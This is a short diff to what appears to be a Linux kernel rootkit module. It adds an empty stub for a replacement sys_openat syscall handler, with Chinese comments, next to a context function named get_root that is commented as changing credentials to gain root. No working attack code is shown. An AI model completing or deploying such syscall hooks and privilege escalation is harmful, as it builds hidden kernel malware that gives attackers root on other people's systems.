@@ -5,6 +5,13 @@
 #include <linux/device.h>
 #include "rootkit.h"
 
+// 自己写的sys_openat函数
+// sys_openat(int dfd,const char__user *filename,int flags,umode_t mode);
+static long my_sys_openat(const struct pt_regs *regs)
+{
+    //todo
+}
+
 // 修改cred获得root权限
 static void get_root(void)
 {
